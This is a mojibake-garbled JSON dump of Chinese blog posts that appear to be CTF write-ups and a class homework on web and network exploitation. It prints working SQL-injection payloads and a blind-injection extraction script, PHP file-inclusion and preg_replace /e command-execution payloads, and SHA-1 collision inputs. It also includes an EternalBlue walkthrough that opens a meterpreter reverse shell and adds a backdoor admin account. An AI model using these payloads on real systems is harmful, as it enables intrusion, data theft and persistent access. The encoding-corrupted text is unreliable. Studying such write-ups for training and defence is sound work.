æ³¨å…¥ç‚¹æ˜¯nameå‚æ•°è¿™é‡Œï¼Œä¸ä¸Šé¢æºç ä¸­çš„æŸ¥è¯¢è¯­å¥ä¸€æ ·ã€‚ ç»è¿‡æµ‹è¯•å‘ç°æœ‰ä¸‰åˆ—ï¼Œname=admin&#39; union select 1,2,3 #&amp;pw=as#æ˜¾ç¤ºæ­£å¸¸ï¼Œname=admn&#39; union select 1,2,3,4#&amp;pw=asæŠ¥é”™ ä½†æ˜¯é¡µé¢æ²¡æœ‰æ•°å­—å›æ˜¾ï¼Œæ‰€ä»¥å¸¸è§„çš„æ³¨å…¥åº”è¯¥æ˜¯ä¸è¡Œçš„ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é¢˜å¯ä»¥çŸ¥é“usernameæ˜¯adminï¼Œ è¾“å…¥username=admin&amp;password=11,æ—¶æç¤ºwrong pass! è¾“å…¥username=admn&amp;password=11,æ—¶æç¤ºwrong user!ï¼Œæ‰€ä»¥å¯ä»¥åˆ¤æ–­ç”¨æˆ·åä¸ºadmin æ¥ä¸‹æ¥ä»‹ç»ä¸€ç§æ–°çš„unionæ³¨å…¥ å…ˆå»ºç«‹ä¸€å¼ è¡¨ 1select * from test where id=0 union select 1,'admin','2322'; unionè¯­å¥åæŸ¥è¯¢çš„æ˜¯è¡¨ä¸­ä¸å­˜åœ¨çš„ä¸€ä¸ªæ•°æ®ï¼ŒæŸ¥è¯¢ç»“æœå¦‚ä¸‹ è¿™ä¸ªç»“æœè¯´æ˜ï¼ŒunionæŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œä¼šå»ºç«‹ä¸€ä¸ªè™šæ‹Ÿè¡¨ï¼Œå…¶ä¸­æ”¾ç€æ‰€æŸ¥è¯¢åˆ°çš„æ•°æ®å’ŒunionååŒ…å«çš„æ•°æ® è¿™é‡Œå°±æ˜¯ id=1,username=admin,password=2322 è¿™æ ·å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ”¹å˜æ•°æ®åº“ä¸­ç”¨æˆ·çš„å¯†ç ï¼Œç„¶åç”¨è‡ªå·±è®¾ç½®çš„å¯†ç ç™»å½• æ¥ä¸‹æ¥ï¼Œåˆ©ç”¨è¿™ç‚¹åšè¿™ä¸ªé¢˜ç›®ï¼Œé¦–å…ˆçŸ¥é“ä¸€å…±ä¸‰åˆ—ï¼Œç¬¬ä¸€åˆ—åº”è¯¥æ˜¯idï¼ŒçŸ¥é“ä¹‹åä¸¤åˆ—çš„å†…å®¹å°±å¯ä»¥äº† name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11æç¤ºçš„wrong user! name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11æç¤ºçš„wrong pass! ç¬¬äºŒåˆ—çš„å­—æ®µååº”è¯¥å°±æ˜¯usernameï¼Œç¬¬ä¸‰åˆ—è‡ªç„¶å°±æ˜¯passwordï¼Œä½†æ˜¯è¿™é¢˜çš„passwordå­—æ®µå­˜æ”¾çš„æ—¶md5åŠ å¯†åçš„å†…å®¹ï¼ˆçœ‹åˆ°å¸ˆå‚…ä»¬çš„wpæ‰çŸ¥é“çš„ï¼Œçœ‹åˆ°æºç ä¹Ÿç¡®å®è¿™æ ·ï¼Œä½†æ˜¯åœ¨æ¯”èµ›çš„æ—¶å€™è¿™ä¹ˆå‘ç°ä¸å¾—è€ŒçŸ¥ï¼‰ payload: 1name=000'union select 1,'admin','b59c67bf196a4758191e42f76670ceba'#&amp;pw=1111 b59c67bf196a4758191e42f76670cebaæ˜¯1111çš„md5å€¼ï¼Œpwçš„å€¼ä¸º1111","tags":[{"name":"äºŒåˆ†æ³¨å…¥","slug":"äºŒåˆ†æ³¨å…¥","permalink":"https://sunzhengyu99.github.io/tags/%E4%BA%8C%E5%88%86%E6%B3%A8%E5%85%A5/"},{"name":"æŠ¥é”™æ³¨å…¥","slug":"æŠ¥é”™æ³¨å…¥","permalink":"https://sunzhengyu99.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"},{"name":"unionæ–°å§¿åŠ¿","slug":"unionæ–°å§¿åŠ¿","permalink":"https://sunzhengyu99.github.io/tags/union%E6%96%B0%E5%A7%BF%E5%8A%BF/"}]},{"title":"BJDCTF2020","date":"2020-09-28T12:26:38.000Z","path":"2020/09/28/BJDCTF2020/","text":"BJDCTF-web easy md5F12çœ‹åˆ°äº†æç¤ºï¼Œç»™å‡ºäº†sqlè¯­å¥ 1Hint: select * from 'admin' where password=md5($pass,true) è¿™é‡Œæ˜¯å°†è¾“å…¥çš„å¯†ç è¿›è¡Œäº†ä¸€æ¬¡md5çš„åŠ å¯† md5()å‡½æ•°ä»‹ç» è¿™é‡Œçš„å‚æ•°raw=true ï¼Œæ‰€ä»¥æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„å¯†ç åŠ å¯†16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼Œå¦‚æœæƒ³å®Œæˆæ³¨å…¥ï¼Œåˆ™md5å€¼ç»è¿‡hexè½¬æˆå­—ç¬¦ä¸²åä¸º â€˜orâ€™â€¦â€¦.è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œåªè¦å‡ºç°äº†orï¼Œä¸”oråé¢çš„å€¼ä¸ºçœŸå³å¯å®Œæˆæ³¨å…¥ã€‚ select * from &#39;admin&#39; where password=&#39; or &#39;sdaa è¿™é‡Œç»å¸¸ä½¿ç”¨çš„å­—ç¬¦ä¸²æ˜¯ffifdyopï¼Œè¯¥å­—ç¬¦ä¸²md5åŠ å¯†åè‹¥rawå‚æ•°ä¸ºTrueæ—¶ä¼šè¿”å› â€˜orâ€™6&lt;trash&gt; (&lt;trash&gt;å…¶å®å°±æ˜¯ä¸€äº›ä¹±ç å’Œä¸å¯è§å­—ç¬¦ï¼Œè¿™é‡Œåªè¦ç¬¬ä¸€ä½æ˜¯éé›¶æ•°å­—å³å¯è¢«åˆ¤å®šä¸ºTrueï¼Œåé¢çš„&lt;trash&gt;ä¼šåœ¨MySQLå°†å…¶è½¬æ¢æˆæ•´å‹æ¯”è¾ƒæ—¶ä¸¢æ‰) æŸ¥è¯¢è¯­å¥ä¸º select * from &#39;admin&#39; where password=&#39;or&#39;6&lt;trash&gt;&#39;æ­¤æŸ¥è¯¢è¯­å¥ç»“æœä¸ºçœŸ æäº¤ ffifdyopåä¼šè·³è½¬åˆ°å¦å¤–çš„é¡µé¢ï¼ŒæŸ¥çœ‹æºç  è¿™é‡Œç›´æ¥åˆ©ç”¨md5()å‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„çš„ç‰¹æ€§ï¼Œgetæäº¤ ?a[]=1&amp;b[]=2 æ¥ä¸‹æ¥è¿˜æœ‰ä¸€æ¬¡è·³è½¬ï¼Œç›´æ¥post param1[]=1&amp;param2[]=2ï¼Œæ‹¿åˆ°flag ä¸è¿‡å¦‚æ­¤123456789101112131415161718&lt;?phperror_reporting(0);$text = $_GET[\"text\"]; //get è·å–ä¸€ä¸ªå‚æ•°text ä½¿ç”¨dataä¼ªåè®®$file = $_GET[\"file\"]; //fileå‚æ•°ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨filterä¼ªåè®®è¯»å–phpé¡µé¢æºç if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"I have a dream\"))&#123; //text çš„å†…å®¹ä½I have a dream echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; if(preg_match(\"/flag/\",$file))&#123; //fileå‚æ•°ä¸èƒ½åŒ…å«flag die(\"Not now!\"); &#125; include($file); //next.php æç¤ºäº†ä¸‹ä¸€ä¸ªé¡µé¢çš„åå­— &#125;else&#123; highlight_file(__FILE__);&#125;?&gt; çœ‹åˆ°äº†fileå‚æ•°ï¼Œæƒ³åˆ°äº†æ–‡ä»¶åŒ…å«çš„æ¼æ´åˆ©ç”¨äºæ˜¯æ„é€ ä»¥ä¸‹çš„payload: ?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read/convert.base64-encode/resource=next.php å¯¹åˆ°äº†index.phpé¡µé¢çš„base64æºç ï¼Œè§£ç åå¦‚ä¸‹ index.php 1234567891011121314151617181920&lt;?php$id = $_GET['id'];$_SESSION['id'] = $id;function complex($re, $str) &#123; return preg_replace( '/(' . $re . ')/ei', 'strtolower(\"\\\\1\")', $str );&#125;foreach($_GET as $re =&gt; $str) &#123; echo complex($re, $str). \"\\n\";&#125;function getFlag()&#123; @eval($_GET['cmd']);&#125; åˆ©ç”¨preg_replace()ä½¿ç”¨çš„/eæ¨¡å¼å¯ä»¥å­˜åœ¨è¿œç¨‹æ‰§è¡Œä»£ç  åœ¨next.phpåœ¨è¾“å…¥ 1next.php?\\S*=$&#123;getFlag()&#125;&amp;cmd=system(\"cat /flag\"); phpä¼ªåè®® preg_replace /eæ¨¡å¼æ¼æ´è¯¦è§£","tags":[{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"phpä¼ªåè®®","slug":"phpä¼ªåè®®","permalink":"https://sunzhengyu99.github.io/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"}]},{"title":"ç½‘å®‰ä½œä¸š","date":"2020-09-27T14:21:14.000Z","path":"2020/09/27/homework/","text":"MS17-010 1.å‡†å¤‡å·¥ä½œå¼€å¯ä¸¤å°è™šæ‹Ÿæœºï¼Œä¸€å°kaliä½œä¸ºæ”»å‡»æ–¹ï¼Œä¸€å°win7ä½œä¸ºè¢«æ”»å‡»æ–¹ å°†ä¸¤å°è™šæ‹Ÿæœºæ¡¥æ¥åˆ°åŒä¸€ç½‘å¡ï¼Œå¹¶ä¿è¯èƒ½å¤Ÿé€šä¿¡ Kali IP 10.1.1.1 255.0.0.0 win7 IP 10.1.1.2 255.0.0.0 æµ‹è¯•ä¸¤å°ä¸»æœºä¹‹é—´çš„é€šä¿¡æƒ…å†µ ä½¿ç”¨msfå‰éœ€è¦å¼€å¯postgresqlæœåŠ¡ å¼€å¯æœåŠ¡ï¼šservice postgresql start æŸ¥çœ‹æœåŠ¡çŠ¶æ€ï¼šservice postgresql status å¼€åˆ°ç»¿è‰²å­—ä½“çš„activeå³ä¸ºå¼€å¯äº† åˆå§‹åŒ–æ•°æ®åº“ï¼šmsfdb init 2. æ”»å‡»è¿‡ç¨‹(1).é¦–å…ˆåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦æ‰“å¼€445ç«¯å£ä½¿ç”¨nmap+ip æ‰«æ (2) .ç¡®è®¤ç›®æ ‡ä¸»æœºæ‰“å¼€445ç«¯å£åç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ”»å‡»è¾“å…¥msfconsole å¯åŠ¨ï½ï½“ï½† è¾“å…¥search MS17-010 æ‰¾åˆ°exploit windows/smb/ms17_010_eternalblue, è¿è¡Œ 1use exploitwindows/smb/ms17_010_eternalblue è¾“å…¥ show options æŸ¥çœ‹éœ€è¦é…ç½®å“ªäº›ä¿¡æ¯ RHOSTS ä¸ºç›®æ ‡ä¸»æœºIP(10.1.1.2) RPORT ä¸ºç›®æ ‡ç«¯å£å·(445) LHOST ä¸ºç›‘å¬ä¸»æœºIP(10.1.1.1) (3). é…ç½®æˆåŠŸåè®¾ç½®tcpè¿æ¥è¾“å…¥å‘½ä»¤ 1set payload windows/x64/meterpreter/reverse_tcp (4).å¼€å§‹è¿è¡Œè¾“å…¥ exploit/run æˆåŠŸè·å–shell æŸ¥çœ‹ipåœ°å€éªŒè¯æ˜¯å¦ä¸ºç›®æ ‡ä¸»æœºã€‚ (5)è®¾ç«‹åé—¨ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·åˆ›å»ºä¸€ä¸ªç”¨æˆ· 1net user test abc123.com /add Username:test password:abc123.com å°†è¯¥ç”¨æˆ·åŠ å…¥ç®¡ç†å‘˜ç»„ï¼Œä½¿å…¶æ‹¥æœ‰ç®¡ç†å‘˜æƒé™ 1net localgroup administrtors test /add ç›®æ ‡ä¸»æœºä¸Šç”¨æˆ·åˆ›å»ºæˆåŠŸ å®éªŒç»“æŸ","tags":[{"name":"msf","slug":"msf","permalink":"https://sunzhengyu99.github.io/tags/msf/"}]},{"title":"cumtctf","date":"2020-09-27T13:26:44.000Z","path":"2020/09/27/cumtctf/","text":"CUMTCTF-wp Webç­¾åˆ°æç¤ºGETä¸€ä¸ª1,é‚£å°± url+?1 æç¤ºpostä¸€ä¸ª2 é‚£å°±postä¸€ä¸ª æ³¨æ„çš„æ˜¯è¦2=ä»»æ„å­—ç¬¦æ‰å‡ºç°æºç  å®¡è®¡ä»£ç ï¼Œè¿™é‡Œåº”è¯¥æ˜¯åˆ©ç”¨file_get_contents()çš„æ¼æ´ç›´æ¥è¯»ç½‘é¡µæºç ï¼Œå¹¶ä¸”æç¤ºflagåœ¨flag.php,ç›´æ¥php://filter/read=convert.base64-encode/resource=flag.phpï¼Œè¯»å–base64æºç ä¹‹åè§£ç å³å¯ PD9waHANCgkkZmxhZz0iQ1VNVENURnsxNzkwNTViNC1lOGY1LTQyZDItYmZlNC0wMjdkMTVlOTQ2YjJ9Ijs= babysqlé¦–å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥username=admin&amp;password=pw&#39; åœ¨åé¢åŠ ä¸Šå•å¼•å·åå‡ºç°æŠ¥é”™æç¤ºï¼Œç¡®è®¤æœ‰æ³¨å…¥ç‚¹ ä½†æ˜¯ç»§ç»­æµ‹è¯• &#39;or 1=1 #ä¼šå‡ºç° åˆ¤æ–­å­˜åœ¨é»‘åå•è¿‡æ»¤ã€‚ æ¥ä¸‹æ¥å°±æ˜¯åˆ¤æ–­æ˜¯å°†ä»€ä¹ˆåŠ å…¥é»‘åå•äº†ï¼Œç»è¿‡å­—å…¸æµ‹è¯•å‘ç°æ˜¯ç©ºæ ¼ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨/**/ç»•è¿‡ã€‚ å…ˆæµ‹è¯•æœ‰å¤šå°‘åˆ—ï¼Œ&#39;union/**/select/**/1,2,3,4,5,6,7# åˆ°ç¬¬ä¸ƒçš„æ—¶å€™ï¼Œé¡µé¢æŠ¥é”™ã€‚ &#39;union/**/select/**/1,2,3,4,5,6,7,8# åˆ°ç¬¬å…«çš„æ—¶å€™æ˜¾ç¤ºä¸‹å›¾ï¼Œè¯´æ˜ä¸€å…±å…«åˆ—ï¼Œå¹¶ä¸”ç¬¬å››åˆ—å‡ºç°å›æ˜¾ã€‚ çˆ†è¡¨ 1username=admin&amp;password=pw'union/**/select/**/1,2,3,group_concat(TABLE_NAME),5,6,7,8/**/from/**/information_schema.TABLES/**/where/**/TABLE_SCHEMA=database()# çˆ†åˆ—å 1username=admin&amp;password=pw'union/**/select/**/1,2,3,group_concat(COLUMN_NAME),5,6,7,8/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_NAME='users'# user_id,first_name,last_name,user,password,avatar,last_login,failed_loginåˆ—åå¾ˆå¤šï¼Œé€‰æ‹©password çˆ†flag 1username=admin&amp;password=pw'union/**/select/**/1,2,3,group_concat(password),5,6,7,8/**/from/**/users# secretæ‰«æä¸€ä¸‹ç›®å½•å‘ç°å­˜åœ¨ä¸€ä¸ªwww.zipçš„æ–‡ä»¶ï¼Œç›´æ¥ä¸‹è½½å¾—åˆ°æºç ï¼Œä¸‹é¢å°±æ˜¯ä¸€å±‚ä¸€å±‚çš„ç»•è¿‡ 123456789101112131415161718192021222324252627282930313233&lt;?phperror_reporting(0);include_once('flag.php');if(isset($_GET['param1']))&#123; $str1=$_GET['param1']; if(file_get_contents($str1)!=='Suvin_wants_a_girlfriend') die(\"Suvin doesn't like you\"); if(isset($_GET['param2']))&#123; $str2=$_GET['param2']; if(!is_numeric($str2)) die('Suvin prefers strings of Numbers'); else if($str2&lt;3600*24*30) die('Suvin says the num is too short'); else if($str2&gt;3600*24*31) die('Suvin says the num is too long'); else &#123; echo \"Suvin says he's falling in love with you!\".\"&lt;/br&gt;\"; sleep(intval($str2)); &#125; if (isset($_POST['param1']) &amp;&amp; isset($_POST['param2'])) &#123; $str1=$_POST['param1']; $str2=$_POST['param2']; if(strlen($str1)&gt;1000) die(\"It's too long\"); if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2))) echo $flag; else die(\"It's so similar to md5\"); &#125; &#125;&#125;?&gt; é¦–å…ˆgetæ–¹å¼è·å–ä¸¤ä¸ªå‚æ•°ï¼Œparam1è¦ç­‰äºé‚£ä¸ªå­—ç¬¦ä¸²ï¼Œè¿™é‡Œä½¿ç”¨phpçš„dataä¼ªåè®® param2è¦åœ¨3600*24*30å’Œ3600*24*31ä¹‹é—´ï¼Œå¯ä»¥å–2.6e6,è¿™ä¸¤ä¸ªå‚æ•°ç»•è¿‡åï¼Œå°±è¦ç»•è¿‡ä¸‹é¢çš„postæ–¹å¼ä¸Šä¼ çš„ä¸¤ä¸ªå€¼ å¯¹parame1çš„é•¿åº¦è¿›è¡Œäº†é™åˆ¶ï¼Œå¹¶ä¸”ä¸¤å‚æ•°çš„å­—ç¬¦ä¸²å½¢å¼ä¸ç›¸ç­‰ï¼Œsha1çš„å€¼è¦ç›¸ç­‰ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯ä¸md5å‡½æ•°ä¸€æ ·ï¼Œä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼Œä½†æ˜¯è¿™é¢˜æ²¡é‚£ä¹ˆç®€å•ï¼Œè¯•äº†å¾ˆå¤šæ¬¡éƒ½ä¸è¡Œã€‚ç½‘ä¸Šæœäº†ä¸€ä¸‹ï¼Œå‘ç°äº†ä¸€ä¸ªå¾ˆç±»ä¼¼çš„é¢˜ç›®ï¼ˆsha1å¼±ç¢°æ’ï¼‰ï¼Œå…¶ä¸­ä¹Ÿç»™å‡ºç¬¦åˆè¦æ±‚çš„å­—ç¬¦ä¸²ã€‚ ç‚¹è¿™é‡Œ å®Œæ•´çš„payloadï¼š ?param1=data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k&amp;param2=0.26e7 12POST:param1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;param2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 è¿˜æœ‰ä¸€ä¸ªå¾ˆå‘çš„åœ°æ–¹ï¼Œhackbarä¸Šä¼ æ—¶æ²¡æœ‰ä½œç”¨ï¼Œåªèƒ½ç”¨bpæŠ“åŒ…ä¸Šä¼ ï¼ŒæŠ“åŒ…æ—¶æ³¨æ„å…ˆéšä¾¿postä¸€ä¸ªå‚æ•°ï¼Œè¿™æ ·æ•°æ®åŒ…æ‰æ˜¯postæ–¹å¼ï¼Œç„¶åè´´ä¸Šä¸Šé¢çš„ä¸¤ä¸ªå‚æ•°å€¼ babysql2æŸ¥è¯¢è¯­å¥ä¸ç¬¬ä¸€ä¸ªæ³¨å…¥ç›¸åŒï¼Œä½†æ˜¯è¿™é¢˜ä¸ç»™å›æ˜¾ï¼ŒçŒœæµ‹æ˜¯ç›²æ³¨ï¼Œä½†æ˜¯å¥½åƒè¿‡æ»¤äº†æ›´å¤šçš„å…³é”®å­— åœ¨1çš„åŸºç¡€ä¸Šé¢å¤–è¿‡æ»¤äº† â€˜ ï¼Œ ascii ï¼Œ mid ï¼Œ substr ï¼Œå…³é—­äº†æŠ¥é”™å›æ˜¾å’Œè¾“å‡ºï¼Œä½†æ˜¯æŸ¥è¯¢æˆåŠŸæˆ–è€…å¤±è´¥ å›æ˜¾ä¸åŒï¼Œå› æ­¤å¯ä»¥boolæ³¨å…¥ã€‚ 123456789101112131415161718192021222324252627url = 'http://219.219.61.234:20004/'password = \"\"string = [ord(i) for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz!_@-&#125;&#123;']#å°†å­—æ¯è½¬æ¢ä¸ºasciiç a = '0x5e' # '\\'çš„asciiç å€¼while(1): for j in string: if (hex(j)[2:]=='7b'): str='5c'+hex(j)[2:] #å°†'&#123;'è½¬ä¹‰ï¼Œ else: str=hex(j)[2:] time.sleep(0.1) payload =\"||/**/(select/**/password/**/from/**/users/**/limit/**/9,1)/**/regexp/**/binary/**/%s/**/#\" % (a + str)# ç›²æ³¨çš„æŸ¥è¯¢è¯­å¥ regexp binary æ˜¯åŒºåˆ†å¤§å°å†™çš„æ­£åˆ™åŒ¹é… data =&#123;\"username\":\"\\\\\",\"password\":payload&#125; print(data) r = requests.post(url,data=data) #è®¿é—® if \"success\" in r.text: #print(r.text) password+=chr(j) print(password) a+=str break if \"wrong\" in r.text: breakprint(password) Cryptoå¹¼å„¿å›­çš„å¯†ç é¢˜å…ˆè½¬æ¢ä¸ºåè¿›åˆ¶ååœ¨çº¿åˆ†è§£åç›´æ¥ä¸Šè„šæœ¬ http://www.factordb.com/ åœ¨çº¿åˆ†è§£ç½‘å€ 123456789101112131415161718192021222324252627282930313233import binasciiimport syssys.setrecursionlimit(1000000)def ByteToHex(bins): return ''.join([\"%02X\" % x for x in bins]).strip()def n2s(num): t = hex(num)[2:-1] # python if len(t) % 2 == 1: t = '0' + t \\#print(t) return(binascii.a2b_hex(t).decode('latin1'))def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: print('modular inverse does not exist') return 'null' else: return x % mc = 40448992051548719008529549070468060415257485938698092782029814901918646701101p = 328413456989577256301798468872388310877q = 324350545929838254331191385863847627003e = 65537n = p * qd = modinv(e, (p - 1) * (q - 1))m = pow(c, d, n)print (m) æ•°å­—è½¬å­—ç¬¦çš„è„šæœ¬ 12345678import binasciidef n2s(num): t = hex(num)[2:-1] # python if len(t) % 2 == 1: t = '0' + t \\#print(t) return(binascii.a2b_hex(t).decode('latin1'))print(n2s(a)) #aä¸ºä¸Šä¸€ä¸ªè„šæœ¬è®¡ç®—å‡ºçš„æ•°å­— å°å­¦ç”Ÿçš„å¯†ç é¢˜åˆä¸­ç”Ÿçš„å¯†ç é¢˜æ¬¡é¢˜ä¸å¹¼å„¿å›­çš„ç±»ä¼¼ï¼Œä½†æ˜¯ç”±äºnè¿‡å¤§ï¼Œè¯•äº†å¾ˆå¤šå·¥å…·éƒ½æ— æ³•åˆ†è§£ã€‚ ä»”ç»†çœ‹é¢˜ä¼šå‘ç°è¿™é¢˜çš„æ¡ä»¶ç»™çš„æ¯”è¾ƒå¤š,çŸ¥é“p-q äºæ˜¯æƒ³åˆ°äº†(p+q)^2-(p-q)^2=4pq=4nï¼Œå¯ä»¥ç®—å‡ºp+q,ä¹‹åè§£å‡ºp,q 12345678910111213141516171819ç®—p,qçš„è„šæœ¬# -*- coding = utf - 8 -*-#@Time : 2020/9/24 21:55#@Author : sunzy#@File : su.pyimport gmpy2n = 848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397p_sub_q = -3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636x = (4*n+p_sub_q*p_sub_q)gmpy2.mpz(x)#p_add_q = gmpy2.iroot(x, 2)p_add_q = 58342634998122692674032973234620896020471694068399847453520741898744437026570834277134765347908181270295928479896424327076716339778780713227054670754114006755614107059128760453507315091935855120450792252194791430498450216725579392051311373554303029775579999984765816108626868293630358812164765119470747267373609041885833415440716244492402495944064255436477147868576748300862501670473856373437423326957856588782039066794320093570665076624361151742737113922376038763268964187459938086360191752544167623804772397201519904950840301831333585995087985697059748872751988663760065650743406672809203915981347563824970092886078# print(p_add_q)y=(p_sub_q+p_add_q)z=(p_add_q-p_sub_q)print(y&gt;&gt;1)print(z&gt;&gt;1) çŸ¥é“p,qåï¼Œæ­¤é¢˜çš„è§£æ³•ä¸å¹¼å„¿å›­çš„è§£æ³•ç›¸åŒ èœé¸¡åªä¼šè¿™ä¹ˆå¤šã€‚ã€‚ã€‚","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"https://sunzhengyu99.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"rsa","slug":"rsa","permalink":"https://sunzhengyu99.github.io/tags/rsa/"}]},{"title":"fakebook","date":"2020-09-27T11:17:01.000Z","path":"2020/09/27/fakebook/","text":"æ”»é˜²ä¸–ç•Œ-fakebookæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ä¸€é“é¢˜ï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹å§ 0x01å‘ç°æ³¨å…¥ç‚¹è¿›å…¥ç½‘é¡µå‘ç°æ˜¯ä¸€ä¸ªåšå®¢é¡µé¢ï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•ä¸Šå»çœ‹çœ‹ï¼Œå‘ç°äº†ä¸€ä¸ªè²Œä¼¼å¯ä»¥æ³¨å…¥çš„åœ°æ–¹ http://220.249.52.133:44224/view.php?no=1å‚æ•°noè¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªæ•°å­—å‹çš„æ³¨å…¥ç‚¹ï¼Œæµ‹è¯•ä¸€ä¸‹ã€‚ http://220.249.52.133:44224/view.php?no=1 and 1=1æ˜¾ç¤ºæ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯ http://220.249.52.133:44224/view.php?no=1 and 1=2ç½‘é¡µæŠ¥é”™ï¼Œç¡®å®šäº†å°±æ˜¯æ•°å­—å‹æ³¨å…¥ æ¥ä¸‹æ¥ç»§ç»­æ³¨å…¥çš„å¸¸è§„æ“ä½œã€‚ http://220.249.52.133:44224/view.php?no=-2 order by 4#æ—¶é¡µé¢æ˜¾ç¤ºæ­£å¸¸ï¼Œå¹¶æç¤ºäº†ç½‘ç«™çš„æ ¹ç›®å½• ä½†æ˜¯å½“ order by 5 # æ—¶ï¼Œç½‘é¡µæŠ¥é”™ï¼Œç¡®å®šæ˜¯å››åˆ—ã€‚ çˆ†è¡¨å æœ¬ä»¥ä¸ºä¼šé¡ºåˆ©çš„çˆ†ç ´å‡ºæ¥ï¼Œä½†æ˜¯æç¤ºäº† hacker ï¼Œè¿™é‡Œå¯èƒ½å­˜åœ¨é»‘åå•æ£€æµ‹ 